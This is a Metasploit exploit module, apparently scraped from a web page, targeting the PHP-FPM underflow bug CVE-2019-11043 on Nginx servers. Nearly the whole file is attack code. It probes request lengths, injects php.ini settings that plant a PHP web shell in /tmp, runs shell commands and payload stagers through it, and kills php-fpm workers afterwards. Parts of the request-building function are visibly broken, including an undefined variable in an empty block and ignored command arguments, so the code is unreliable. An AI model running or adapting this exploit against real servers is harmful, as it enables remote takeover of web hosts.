# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;PHP-FPM Underflow RCE&#039;,
        &#039;Description&#039;    => %q(
          This module exploits an underflow vulnerability in versions 7.1.x
          below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on
          Nginx. Only servers with certains Nginx + PHP-FPM configurations are
          exploitable. This is a port of the original neex&#039;s exploit code (see
          refs.). First, it detects the correct parameters (Query String Length
          and custom header length) needed to trigger code execution. This step
          determines if the target is actually vulnerable (Check method). Then,
          the exploit sets a series of PHP INI directives to create a file
          locally on the target, which enables code execution through a query
          string parameter. This is used to execute normal payload stagers.
          Finally, this module does some cleanup by killing local PHP-FPM
          workers (those are spawned automatically once killed) and removing
          the created local file.
        ),
        &#039;Author&#039;         => [
          &#039;neex&#039;,          # (Emil Lerner) Discovery and original exploit code
          &#039;cdelafuente-r7&#039; # This module
        ],
        &#039;References&#039;     =>
          [
            [&#039;CVE&#039;, &#039;2019-11043&#039;],
            [&#039;EDB&#039;, &#039;47553&#039;],
            [&#039;URL&#039;, &#039;https://github.com/neex/phuip-fpizdam&#039;],
            [&#039;URL&#039;, &#039;https://bugs.php.net/bug.php?id=78599&#039;],
            [&#039;URL&#039;, &#039;https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html&#039;]
          ],
        &#039;DisclosureDate&#039; => "2019-10-22",
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Payload&#039;        => {
          &#039;BadChars&#039; => "&>\&#039; "
        },
        &#039;Targets&#039;        => [
          [
            &#039;PHP&#039;, {
              &#039;Platform&#039; => &#039;php&#039;,
              &#039;Arch&#039;     => ARCH_PHP,
              &#039;Payload&#039;  => {
                &#039;PrependEncoder&#039; => "php -r \"",
                &#039;AppendEncoder&#039;  => "\""
              }
            }
          ],
          [
            &#039;Shell Command&#039;, {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039;     => ARCH_CMD
            }
          ]
        ],
        &#039;DefaultTarget&#039; => 0,
        &#039;Notes&#039;         => {
          &#039;Stability&#039;   => [CRASH_SERVICE_RESTARTS],
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to a PHP page&#039;, &#039;/index.php&#039;])
    ])

    register_advanced_options([
      OptInt.new(&#039;MinQSL&#039;, [true, &#039;Minimum query string length&#039;, 1500]),
      OptInt.new(&#039;MaxQSL&#039;, [true, &#039;Maximum query string length&#039;, 1950]),
      OptInt.new(&#039;QSLHint&#039;, [false, &#039;Query string length hint&#039;]),
      OptInt.new(&#039;QSLDetectStep&#039;, [true, &#039;Query string length detect step&#039;, 5]),
      OptInt.new(&#039;MaxQSLCandidates&#039;, [true, &#039;Max query string length candidates&#039;, 10]),
      OptInt.new(&#039;MaxQSLDetectDelta&#039;, [true, &#039;Max query string length detection delta&#039;, 10]),
      OptInt.new(&#039;MaxCustomHeaderLength&#039;, [true, &#039;Max custom header length&#039;, 256]),
      OptInt.new(&#039;CustomHeaderLengthHint&#039;, [false, &#039;Custom header length hint&#039;]),
      OptEnum.new(&#039;DetectMethod&#039;, [true, "Detection method", &#039;session.auto_start&#039;, self.class.detect_methods.keys]),
      OptInt.new(&#039;OperationMaxRetries&#039;, [true, &#039;Maximum of operation retries&#039;, 20])
    ])
    @filename = rand_text_alpha(1)
    @http_param = rand_text_alpha(1)
  end

  CHECK_COMMAND   = "which which"
  SUCCESS_PATTERN = "/bin/which"

  class DetectMethod
    attr_reader :php_option_enable, :php_option_disable

    def initialize(php_option_enable:, php_option_disable:, check_cb:)
      @php_option_enable = php_option_enable
      @php_option_disable = php_option_disable
      @check_cb = check_cb
    end

    def php_option_enabled?(res)
      !!@check_cb.call(res)
    end
  end

  def self.detect_methods
    {
      &#039;session.auto_start&#039; => DetectMethod.new(
        php_option_enable: &#039;session.auto_start=1&#039;,
        php_option_disable: &#039;session.auto_start=0&#039;,
        check_cb: ->(res) { res.get_cookies =~ /PHPSESSID=/ }
      ),
      &#039;output_handler.md5&#039; => DetectMethod.new(
        php_option_enable:  &#039;output_handler=md5&#039;,
        php_option_disable: &#039;output_handler=NULL&#039;,
        check_cb: ->(res) { res.body.length == 16 }
      )
    }
  end

  def send_crafted_request(path:, qsl: datastore[&#039;MinQSL&#039;], customh_length: 1, cmd: &#039;&#039;, allow_retry: true)
    uri = URI.encode(normalize_uri(target_uri.path, path)).gsub(/([?&])/, {&#039;?&#039;=>&#039;%3F&#039;, &#039;&&#039;=>&#039;%26&#039;})
    qsl_delta = uri.length - path.length - URI.encode(target_uri.path).length
    if qsl_delta.odd?
      fail_with Failure::Unknown, "Got odd qslDelta, that means the URL encoding gone wrong: path=#{path}, qsl_delta=#{qsl_delta}"
    end
    if qsl_prime < 0
    end
    opts = {
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => uri,
      &#039;headers&#039; => {
        &#039;CustomH&#039; => "x=#{Rex::Text.rand_text_alphanumeric(customh_length)}",
        &#039;Nuut&#039;    => Rex::Text.rand_text_alphanumeric(11)
      }
    }
    actual_timeout = datastore[&#039;HttpClientTimeout&#039;] if datastore[&#039;HttpClientTimeout&#039;]&.> 0
    actual_timeout ||= 20

    connect(opts) if client.nil? || !client.conn?
    # By default, try to reuse an existing connection (persist option).
    res = client.send_recv(client.request_raw(opts), actual_timeout, true)
    if res.nil? && allow_retry
      # The server closed the connection, resend without &#039;persist&#039;, which forces
      # reconnecting. This could happen if the connection is reused too much time.
      # Nginx will automatically close a keepalive connection after 100 requests
      # by default or whatever value is set by the &#039;keepalive_requests&#039; option.
      res = client.send_recv(client.request_raw(opts), actual_timeout)
    end
    res
  end

  def repeat_operation(op, opts={})
    datastore[&#039;OperationMaxRetries&#039;].times do |i|
      vprint_status("#{op}: try ##{i+1}")
      res = opts.empty? ? send(op) : send(op, opts)
      return res if res
    end
    nil
  end

  def extend_qsl_list(qsl_candidates)
    qsl_candidates.each_with_object([]) do |qsl, extended_qsl|
      (0..datastore[&#039;MaxQSLDetectDelta&#039;]).step(datastore[&#039;QSLDetectStep&#039;]) do |delta|
        extended_qsl << qsl - delta
      end
    end.sort.uniq
  end

  def sanity_check?
    datastore[&#039;OperationMaxRetries&#039;].times do
      res = send_crafted_request(
        path: "/PHP\nSOSAT",
        qsl: datastore[&#039;MaxQSL&#039;],
        customh_length: datastore[&#039;MaxCustomHeaderLength&#039;]
      )
      unless res
        vprint_error("Error during sanity check")
        return false
      end
      if res.code != @base_status
        vprint_error(
          "Invalid status code: #{res.code} (must be #{@base_status}). "\
          "Maybe \".php\" suffix is required?"
        )
        return false
      end
      detect_method = self.class.detect_methods[datastore[&#039;DetectMethod&#039;]]
      if detect_method.php_option_enabled?(res)
        vprint_error(
          "Detection method &#039;#{datastore[&#039;DetectMethod&#039;]}&#039; won&#039;t work since "\
          "the PHP option has already been set on the target. Try another one"
        )
        return false
      end
    end
    return true
  end

  def set_php_setting(php_setting:, qsl:, customh_length:, cmd: &#039;&#039;)
    res = nil
    path = "/PHP_VALUE\n#{php_setting}"
    pos_offset = 34
    if path.length > pos_offset
      vprint_error(
        "The path size (#{path.length} bytes) is larger than the allowed size "\
        "(#{pos_offset} bytes). Choose a shorter php.ini value (current: &#039;#{php_setting}&#039;)")
      return nil
    end
    path += &#039;;&#039; * (pos_offset - path.length)
    res = send_crafted_request(
      path: path,
      qsl: qsl,
      customh_length: customh_length,
      cmd: cmd
    )
    unless res
      vprint_error("error while setting #{php_setting} for qsl=#{qsl}, customh_length=#{customh_length}")
    end
    return res
  end

  def send_params_detection(qsl_candidates:, customh_length:, detect_method:)
    php_setting = detect_method.php_option_enable
    vprint_status("Iterating until the PHP option is enabled (#{php_setting})...")
    customh_lengths = customh_length ? [customh_length] : (1..datastore[&#039;MaxCustomHeaderLength&#039;]).to_a
    qsl_candidates.product(customh_lengths) do |qsl, c_length|
      res = set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)
      unless res
        vprint_error("Error for qsl=#{qsl}, customh_length=#{c_length}")
        return nil
      end
      if res.code != @base_status
        vprint_status("Status code #{res.code} for qsl=#{qsl}, customh_length=#{c_length}")
      end
      if detect_method.php_option_enabled?(res)
        php_setting = detect_method.php_option_disable
        vprint_status("Attack params found, disabling PHP option (#{php_setting})...")
        set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)
        return { qsl: qsl, customh_length: c_length }
      end
    end
    return nil
  end

  def detect_params(qsl_candidates)
    customh_length = nil
    if datastore[&#039;CustomHeaderLengthHint&#039;]
      vprint_status(
        "Using custom header length hint for max length (customh_length="\
        "#{datastore[&#039;CustomHeaderLengthHint&#039;]})"
      )
      customh_length = datastore[&#039;CustomHeaderLengthHint&#039;]
    end
    detect_method = self.class.detect_methods[datastore[&#039;DetectMethod&#039;]]
    return repeat_operation(
      :send_params_detection,
      qsl_candidates: qsl_candidates,
      customh_length: customh_length,
      detect_method: detect_method
    )
  end

  def send_attack_chain
    [
      "short_open_tag=1",
      "html_errors=0",
      "include_path=/tmp",
      "log_errors=1",
      "error_reporting=2",
      "error_log=/tmp/#{@filename}",
      "extension_dir=\"<?=`\"",
      "extension=\"$_GET[#{@http_param}]`?>\""
    ].each do |php_setting|
      vprint_status("Sending php.ini setting: #{php_setting}")
      res = set_php_setting(
        php_setting: php_setting,
        qsl: @params[:qsl],
        customh_length: @params[:customh_length],
        cmd: "/bin/sh -c &#039;#{CHECK_COMMAND}&#039;"
      )
      if res
        return res if res.body.include?(SUCCESS_PATTERN)
      else
        print_error("Error when setting #{php_setting}")
        return nil
      end
    end
    return nil
  end

  def send_payload
    disconnect(client) if client&.conn?
    send_crafted_request(
      path: &#039;/&#039;,
      qsl: @params[:qsl],
      customh_length: @params[:customh_length],
      cmd: payload.encoded,
      allow_retry: false
    )
    Rex.sleep(1)
    return session_created? ? true : nil
  end

  def send_backdoor_cleanup
    cleanup_command = ";echo &#039;<?php echo `$_GET[#{@http_param}]`;return;?>&#039;>/tmp/#{@filename}"
    res = send_crafted_request(
      path: &#039;/&#039;,
      qsl: @params[:qsl],
      customh_length: @params[:customh_length],
      cmd: cleanup_command + &#039;;&#039; + CHECK_COMMAND
    )
    return res if res&.body.include?(SUCCESS_PATTERN)
    return nil
  end

  def detect_qsl
    qsl_candidates = []
    (datastore[&#039;MinQSL&#039;]..datastore[&#039;MaxQSL&#039;]).step(datastore[&#039;QSLDetectStep&#039;]) do |qsl|
      res = send_crafted_request(path: "/PHP\nabcdefghijklmopqrstuv.php", qsl: qsl)
      unless res
        vprint_error("Error when sending query with QSL=#{qsl}")
        next
      end
      if res.code != @base_status
        vprint_status("Status code #{res.code} for qsl=#{qsl}, adding as a candidate")
        qsl_candidates << qsl
      end
    end
    qsl_candidates
  end

  def check
    print_status("Sending baseline query...")
    res = send_crafted_request(path: "/path\ninfo.php")
    return CheckCode::Unknown("Error when sending baseline query") unless res
    @base_status = res.code
    vprint_status("Base status code is #{@base_status}")

    if datastore[&#039;QSLHint&#039;]
      print_status("Skipping qsl detection, using hint (qsl=#{datastore[&#039;QSLHint&#039;]})")
      qsl_candidates = [datastore[&#039;QSLHint&#039;]]
    else
      print_status("Detecting QSL...")
      qsl_candidates = detect_qsl
    end
    if qsl_candidates.empty?
      return CheckCode::Detected("No qsl candidates found, not vulnerable or something went wrong")
    end
    if qsl_candidates.size > datastore[&#039;MaxQSLCandidates&#039;]
      return CheckCode::Detected("Too many qsl candidates found, looks like I got banned")
    end

    print_good("The target is probably vulnerable. Possible QSLs: #{qsl_candidates}")

    qsl_candidates = extend_qsl_list(qsl_candidates)
    vprint_status("Extended QSL list: #{qsl_candidates}")

    print_status("Doing sanity check...")
    return CheckCode::Detected(&#039;Sanity check failed&#039;) unless sanity_check?

    print_status("Detecting attack parameters...")
    @params = detect_params(qsl_candidates)
    return CheckCode::Detected(&#039;Unable to detect parameters&#039;) unless @params

    print_good("Parameters found: QSL=#{@params[:qsl]}, customh_length=#{@params[:customh_length]}")
    print_good("Target is vulnerable!")
    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;
    end
    if @params[:qsl].nil? || @params[:customh_length].nil?
      fail_with Failure::NotVulnerable, &#039;Attack parameters not found&#039;
    end

    print_status("Performing attack using php.ini settings...")
    if repeat_operation(:send_attack_chain)
      print_good("Success! Was able to execute a command by appending &#039;#{CHECK_COMMAND}&#039;")
    else
      fail_with Failure::Unknown, &#039;Failed to send the attack chain&#039;
    end

    print_status("Trying to cleanup /tmp/#{@filename}...")
    if repeat_operation(:send_backdoor_cleanup)
      print_good(&#039;Cleanup done!&#039;)
    end

    print_status("Sending payload...")
    repeat_operation(:send_payload)
  end

  def send_cleanup(cleanup_cmd:)
    res = send_crafted_request(
      path: &#039;/&#039;,
      qsl: @params[:qsl],
      customh_length: @params[:customh_length],
      cmd: cleanup_cmd
    )
    return res if res && res.code != @base_status
    return nil
  end

  def cleanup
    return unless successful
    kill_workers = &#039;for p in `pidof php-fpm`; do kill -9 $p;done&#039;
    rm = "rm -f /tmp/#{@filename}"
    cleanup_cmd = kill_workers + &#039;;&#039; + rm
    disconnect(client) if client&.conn?
    print_status("Remove /tmp/#{@filename} and kill workers...")
    if repeat_operation(:send_cleanup, cleanup_cmd: cleanup_cmd)
      print_good("Done!")
    else
      print_bad(
        "Could not cleanup. Run these commands before terminating the session: "\
        "#{kill_workers}; #{rm}"
      )
    end
  end
end

